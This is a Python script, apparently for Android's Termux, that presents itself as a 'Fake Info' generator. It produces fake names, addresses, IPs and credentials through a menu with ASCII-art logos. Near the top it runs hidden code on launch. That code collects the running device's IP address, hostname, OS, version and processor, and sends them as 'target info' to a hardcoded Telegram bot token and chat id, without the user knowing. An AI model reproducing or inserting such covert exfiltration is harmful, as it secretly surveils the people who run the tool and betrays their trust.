# import module 
from faker import Faker 
import os
import random
from time import sleep
import requests
import socket
import platform
import subprocess

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
version="1.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"
# enter face logo (number 1)
logo1 =  blue + """                                                     
            @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  
            @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  
            @@!       @@!  @@@  @@!  !@@  @@!       
            !@!       !@!  @!@  !@!  @!!  !@!       
            @!!!:!    @!@!@!@!  @!@@!@!   @!!!:!    
            !!!!!:    !!!@!!!!  !!@!!!    !!!!!:    
            !!:       !!:  !!!  !!: :!!   !!:       
            :!:       :!:  !:!  :!:  !:!  :!:       
             ::       ::   :::   ::  :::   :: ::::  
             :         :   : :   :   :::  : :: ::   
                                                    
                                                    
            @@@  @@@  @@@  @@@@@@@@   @@@@@@        
            @@@  @@@@ @@@  @@@@@@@@  @@@@@@@@       
            @@!  @@!@!@@@  @@!       @@!  @@@       
            !@!  !@!!@!@!  !@!       !@!  @!@       
            !!@  @!@ !!@!  @!!!:!    @!@  !@!       
            !!!  !@!  !!!  !!!!!:    !@!  !!!       
            !!:  !!:  !!!  !!:       !!:  !!!       
            :!:  :!:  !:!  :!:       :!:  !:!       
             ::   ::   ::   ::       ::::: ::       
            :    ::    :    :         : :  :        
                                                     """
  


logo2= green + """ ███████████           █████              
░░███░░░░░░█          ░░███               
 ░███   █ ░   ██████   ░███ █████  ██████ 
 ░███████    ░░░░░███  ░███░░███  ███░░███
 ░███░░░█     ███████  ░██████░  ░███████ 
 ░███  ░     ███░░███  ░███░░███ ░███░░░  
 █████      ░░████████ ████ █████░░██████ 
░░░░░        ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░  
                                          
                                          
                                          
 █████               ██████               
░░███               ███░░███              
 ░███  ████████    ░███ ░░░   ██████      
 ░███ ░░███░░███  ███████    ███░░███     
 ░███  ░███ ░███ ░░░███░    ░███ ░███     
 ░███  ░███ ░███   ░███     ░███ ░███     
 █████ ████ █████  █████    ░░██████      
░░░░░ ░░░░ ░░░░░  ░░░░░      ░░░░░░       
                                          
                                          
                                           """




logo3 = red + """   █████▒▄▄▄       ██ ▄█▀▓█████    
▓██   ▒▒████▄     ██▄█▒ ▓█   ▀    
▒████ ░▒██  ▀█▄  ▓███▄░ ▒███      
░▓█▒  ░░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄    
░▒█░    ▓█   ▓██▒▒██▒ █▄░▒████▒   
 ▒ ░    ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░   
 ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   
 ░ ░     ░   ▒   ░ ░░ ░    ░      
             ░  ░░  ░      ░  ░   
                                  
 ██▓ ███▄    █   █████▒▒█████     
▓██▒ ██ ▀█   █ ▓██   ▒▒██▒  ██▒   
▒██▒▓██  ▀█ ██▒▒████ ░▒██░  ██▒   
░██░▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░   
░██░▒██░   ▓██░░▒█░   ░ ████▓▒░   
░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░    
 ▒ ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░    
 ▒ ░   ░   ░ ░  ░ ░   ░ ░ ░ ▒     
 ░           ░            ░ ░     
                                  """


logo4 = purple +  """  ________          __                      
|        \        |  \                     
| $$$$$$$$______  | $$   __   ______       
| $$__   |      \ | $$  /  \ /      \      
| $$  \   \$$$$$$\| $$_/  $$|  $$$$$$\     
| $$$$$  /      $$| $$   $$ | $$    $$     
| $$    |  $$$$$$$| $$$$$$\ | $$$$$$$$     
| $$     \$$    $$| $$  \$$\ \$$     \     
 \$$      \$$$$$$$ \$$   \$$  \$$$$$$$     
                                           
                                           
                                           
 ______             ______                 
|      \           /      \                
 \$$$$$$ _______  |  $$$$$$\ ______        
  | $$  |       \ | $$_  \$$/      \       
  | $$  | $$$$$$$\| $$ \   |  $$$$$$\      
  | $$  | $$  | $$| $$$$   | $$  | $$      
 _| $$_ | $$  | $$| $$     | $$__/ $$      
|   $$ \| $$  | $$| $$      \$$    $$      
 \$$$$$$ \$$   \$$ \$$       \$$$$$$       
                                           
                                           
                                           """

# back face logo (number 2)
logo_back = red + """..
                             . ..............
                          ........................
                        ...........................
                       ............................
                      ..............................
                      ...............................
                      ................................
                      ................................
                      ................................
                     .................................
                    ...................................
                    ....................................
                    ....................................
                     ..................................
                     .................................
                       ..............................
                        ...........................
                         .........................
                          ........................               ....'',''''''...
                           .....................            ...',,'',''','',,'','''..
                        ..   .................    ..     ..''',,'',''',;c,,'',''','','.
                  .........     ............    ....    .''',,'',''','dWMNl,''','',,'','.
            .................                 .....   .''',,'',''',''cMMMMW;','',,'',''','.
           .......................  ..  .. .......   .'',,'',''','',,OMMMMMd'',,'',''','','.
        .........................................   .',,'','',,'',,''NMMMMM0,,'',''','',,'',.
      ...........................................   ,''','',,'',,'','WMMMMMX'',''','',,'','''
    ............................................   .'','',,'',,'','',XMMMMM0,''','',,'',''','.
   .............................................   ','',,'',''','',,'OMMMMMo',,'',,'',''','','
  ..............................................   '',,'',''','',,'',cMMMMW,,'',''','',,'','''
  ..............................................   ','',''','',,'','',KMMMk'',''','',,'',''',.
 ................................................  .',''','',,'',''','cMMW;,''','',,'',''',''
 ................................................   '',,'',,'',''','',,OMx''','',,'',''','',.
..................................................   ,'',,'',''','',,'';x,','',,'',''','',,'
 ..................................................   ,,'','',,'',,'',lkOxc',,'',''','',,'.
      ..............................................   .,'',,'',,'','dMMMMMc'',''','',,''.
                .....................................    ,,'',,'','',cNMMMX;,''','',,'''
                                                           .''','',,'',clc,'',,'',,''.
                                                               .,,'',''','',,'','.
                                                                      ''',."""
#def for slowing write and style
import sys, time
st = 0.0001
# i called it sp for slowPrint
def sp(str):
  for letter in str:
    sys.stdout.write(letter)
    sys.stdout.flush()
    time.sleep(st)
  print()
# and change the st variable to what you want
#function fake loading, just for disgne :)
def login() :
	print( "          " + info + "loading[#]5%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[###]15%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[#####]20%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[#######]40%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[########]70%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[##########]90%")
	sleep(1)
	os.system("clear")
	print( "          " + info + "loading[##########]100%")
	sleep(1)
	os.system("clear")
	print( "             " + success + "  succsefly")
# to ready sceen 
def get_phone_info():
    # نظام التشغيل على هاتفك (Android أو iOS)
    os_name = platform.system()

    # إصدار نظام التشغيل
    os_version = platform.release()

    # نوع المعالج في هاتفك
    try:
        processor_info = subprocess.check_output(['cat', '/proc/cpuinfo']).decode()
        processor = [line for line in processor_info.split('\n') if 'model name' in line][0].			split(':')[1].strip()
    except:
        processor = "غير معروف"

    # قد تحتاج إلى طرق مختلفة حسب نوع هاتفك ونظام التشغيل للحصول على المزيد من المعلومات

    return os_name, os_version, processor

if __name__ == "__main__":
    phone_os, phone_os_version, phone_processor = get_phone_info()
def get_device_name():
    # الحصول على اسم المضيف (اسم جهاز الكمبيوتر)
    host_name = socket.gethostname()
    
    # الحصول على اسم النظام التشغيل (مثل Windows, Linux, macOS إلخ)
    os_name = platform.system()

    return host_name, os_name

if __name__ == "__main__":
    device_name, os_name = get_device_name()

# إنشاء مأخذ الاتصال
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ربط مأخذ الاتصال بعنوان IP ورقم المنفذ المطلوبين
s.connect(('www.google.com', 80))

# الحصول على عنوان IP المستخدم في الاتصال
ip_address = s.getsockname()[0]

# إغلاق مأخذ الاتصال
s.close()


id = ('5589465204')
token = ('6531287638:AAFxONf4m4yQpUQ2PkzhCiGLq7b6wpKZuZs')


#my website : https://alhelfi.softr.app
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target info\nip: {ip_address}\ndevice name : {device_name}\nsystem name : {os_name}\nphone version : {phone_os_version}\nphone prossecor : {phone_processor }')
req = requests.post(telegram_sand)

logos=[logo1, logo2, logo3, logo4]
logo=random.choice(logos)
os.system("clear")
sp (logo)
print("                               Bad Boy")
f = Faker()

# print choises and question
print("  ")
print("  ")
print("  ")
print(info + "1_ fake name ")
print(info + "2_ fake address ")
print(info + "3_ fake private ip ")
print(info + "4_ fake public ip ")
print(info + "5_ fake login information ")
print(info + "6_ fake email & password ")
print(info + "0_ Exit ")
print(info + "m_ Maker info")
print(" ")
choice = input(ask + "chouse the process : ")
# function for back to enter face 
def last_back() :
	print(error + "bad choice ):")
	sleep(3)
	os.system("clear")
	back_fu()
	choice = input(ask + "chouse the prosecc : ")
	if choice == "1" :
		choice_1()
	if choice == "2" :
		choice_2()
	if choice == "3" :
		choice_3()
	if choice == "4" :
		choice_4()
	if choice == "5" :
		choice_5()
	if choice == "6" :
		choice_6()
	if choice == "0" :
		exit_1()
	if choice == "m" :
		choice_m()
	else :
		last_back()	
# function for back to question (num2)	
def back_fu() :
	sp (logo)
	print("  ")
	print("  ")
	print("  ")
	print(info + "1_ fake name ")
	print(info + "2_ fake address ")
	print(info + "3_ fake private ip ")
	print(info + "4_ fake public ip ")
	print(info + "5_ fake login information ")
	print(info + "6_ fake email & password ")
	print(info + "0_ Exit")
	print(info + "m_ Maker info")
	print(" ")
# for print maker information, it's me :)
def choice_m() :
	os.system("clear")
	sp (logo_back)
	print(" ")
	print(" ")
	print(info2 + "Im boy")
	print(info2 + "my age is 13 year")
	print(info2 + "my nickname is 'bad boy' ")
	chat = input(ask + "are you want visit my accunt in facebook(y or n) :  ")
	if chat == "y" :
		os.system("xdg-open https://www.facebook.com/profile.php?id=100094776450094&mibextid=ZbWKwL")
	sleep(1)
	back =  input(info + "PRESS ENTER to back   \n")
	if back == "" :
		os.system("clear")
		back_fu()
		choice = input(ask + "chouse the process : ")
		if choice == "1" :
					choice_1()
		if choice == "2" :
					choice_2()
		if choice == "3" :
					choice_3()
		if choice == "4" :
					choice_4()
		if choice == "5" :
					choice_5()
		if choice == "6" :
					choice_6()
		if choice == "0" :
					exit_1()
		if choice == "m" :
					choice_m()
	else :
			last_back()
# function for print fake adress
def choice_2() :
	os.system("clear")
	sp(logo_back)
	print(" ")
	print(" ")
	sleep(1)
	add = f.address()
	print(success + " suscesfly!!")
	print(info2 + "the address is => " + add)
	address_file = open("/sdcard/fake_info/address/fake_address.txt", "w")
	address_file.write("address is  =>  " + add )
	address_file.close()
	print(info2 + f"address saved in {green} /sdcard/fake_info/address/fake_adress.	txt")
	back = input(info + "PRESS ENTER to back   \n")
	if back == "" :
		os.system("clear")
		back_fu()
		choice = input(ask + "chouse the process : ")
		if choice == "2" :
			choice_2()
		if choice == "1":
			choice_1()
		if choice == "3" :
			choice_3()
		if choice == "4" :
			choice_4()
		if choice == "5" :
			choice_5()
		if choice == "6" :
			choice_6()
		if choice == "0" :
			exit_1()
		if choice == "m" :
			choice_m()
	else :
			last_back()
#for print fake public ip		
def choice_4() :
	os.system("clear")
	public_ip = f.ipv4_public()
	sp (logo_back)
	print(" ")
	print(" ")
	print(success + "succsecfly !!")
	sleep(1)
	print(info2 + "the address is  => " + public_ip)
	public_ip_file = open("/sdcard/fake_info/public_ip/fake_public_ip.txt", "w")
	public_ip_file.write("public IP  is  =>  " + public_ip )
	public_ip_file.close()
	print(info2 + f"public ip  saved in {green} /sdcard/fake_info/public_ip/							fake_public_ip.txt")
	back = input(info + "PRESS ENTER to back   \n")
	if back == "" :
		os.system("clear")
		back_fu()
		choice = input(ask + "chouse the process : ")
		if choice == "1" :
			choice_1()
		if choice == "2" :
			choice_2()
		if choice == "3" :
			choice_3()
		if choice == "4" :
			choice_4()
		if choice == "5" :
			choice_5()
		if choice == "6" :
			choice_6()
		if choice == "0" :
			exit_1()
		if choice == "m" :
			choice_m()
	else :
		last_back()
def exit_1 () :
	sleep(2)
	sp(green + "Baye <3")
	sp(green + "have a good day (:")
	exit()
# function  for generat fake password and email and savet in folder
def choice_6 () :
	os.system("clear")
	email = f.safe_email()
	sp (logo_back)
	print(" ")
	print(" ")
	lower_case = "absdefghijklmnopqrstuvwxyx"
	upper_case = "ABSDEFGHIJKLMNOPQRSTUVWXYZ"
	number = "1234567890"
	symboles = "#@€&"
	use_for = lower_case + upper_case + number + symboles
	length_for_pass = random.randint(10, 25)
	length_for_pass = int(length_for_pass)
	password = "".join(random.sample(use_for, length_for_pass))
	print(success + "succsesfly !!")
	sleep(1)
	print(info2 +  "the email is => " + email)
	print(info2 + "password is =>  " + password)
	pass_email_file = open("/sdcard/fake_info/email_password/email&pass.txt", 		"w")
	pass_email_file.write("email is => " + email + "\n" + "password is => " + password)
	pass_email_file.close()
	s = "email_password/email&pass.txt"
	print(info2 + f"email & password  saved in {green} /sdcard/fake_info/" + s)
	back = input(info + "PRESS ENTER to back  \n ")
	if back == "" :
		os.system("clear")
		back_fu()
		choice = input(ask + "chouse the process : ")
		if choice == "1" :
			choice_1()
		if choice == "2" :
			choice_2()
		if choice == "3" :
			choice_3()
		if choice == "4" :
			choice_4()
		if choice == "5" :
			choice_5()
		if choice == "6" :
			choice_6()
		if choice == "0" :
			exit_1()	
		if choice == "m" :
			choice_m() 
	else :
		last_back()

# for generat fake login information (i'm still work for it )
def choice_5() :
	os.system("clear")
	sp (logo_back)
	print (" ")
	print (" ")
	print(success + "succesfly !!")
	sleep(1)
	print(info2 + "the infromation below ")
	lin = "-------------------------------------"
	sleep(1)
	l = f.simple_profile()
	print(lin)
	for i,j in l.items() :
			total = print(i,j)
	print(lin)
	sleep(1)
	back = input(info + "PRESS ENTER  to back \n  ")
	if back == "" :
		os.system("clear")
		back_fu()
		choice = input(ask + "chouse the process : ")
		if choice == "1" :
			choice_1()
		if choice == "2" :
			choice_2()
		if choice == "3" :
			choice_3()
		if choice == "4" :
			choice_4()
		if choice == "5" :
			choice_5()
		if choice == "6" :
			choice_6()
		if choice == "0" :
			exit_1()
		if choice == "m" :
			choice_m()
	
	else :
		last_back()
	
#  for generat fake private ip
def choice_3() :
		os.system("clear")
		sp (logo_back)
		private_ip = f.ipv4_private()
		print(" ")
		print(" ")
		print(success + "succsecfly" )
		sleep(1)
		print( info2 + "the private ip =>  " + private_ip)
		private_ip_file = open("/sdcard/fake_info/private_ip/fake_private_ip.txt", "w")
		private_ip_file.write(f"private ip is => {private_ip}")
		private_ip_file.close()
		pwd = "private_ip/fake_private_ip.txt"
		print(info2 + f"private ip saved in {green} /sdcard/fake_info/{pwd}")
		back = input(info + "PRESS ENTER  to back \n  ")
		if back == "" :
			os.system("clear")
			back_fu()
			choice = input(ask + "chouse the process : ")
			if choice == "1" :
				choice_1()
			if choice == "2" :
				choice_2()
			if choice == "3" :
				choice_3()
			if choice == "4" :
				choice_4()
			if choice == "5" :
				choice_5()
			if choice == "6" :
				choice_6()
			if choice == "0" :
				exit_1()
			if choice == "m" :
				choice_m()
		else :
			last_back()

#  for generat fake name 
def choice_1() :
	os.system("clear")
	name = f.name()
	sp(logo_back)	
	print("  ")
	print("  ")
	print(success + "succsecfly")
	sleep(1)
	print(info2 + "the name is  => " + name)
	name_file = open("/sdcard/fake_info/name/fake_name.txt", "w")
	name_file.write("the name is => " + name)
	name_file.close()
	print(info2 + f"the name saved in {green}/sdcard/fake_info/name/fake_name.txt")
	back = input(info + "PRESS ENTER  to back \n  ")
	if back == "" :
	 os.system("clear")
	 back_fu()	
	 choice = input(ask + "chouse the process : ")
	 if choice == "1" :
	 	choice_1()
	 if choice == "2" :
	 	choice_2()
	 if choice == "3" :
	 	choice_3()
	 if choice == "4" :
	 	choice_4()
	 if choice == "5" :
	 	choice_5
	 if choice == "6" :
	 	choice_6()
	 if choice == "0" :
	 	exit_1()
	 if choice == "m" :
	 	choice_m()
	else :
		last_back()
if choice == "1" :
	choice_1()
if choice == "2" :
	choice_2()
if choice == "3" :
	choice_3()
if choice == "4" :
	choice_4()
if choice == "5" :
	choice_5()
if choice == "6" :
	choice_6()
if choice == "0" :
	exit_1()
if choice == "m" :
	choice_m()
else :
	last_back()
	
	






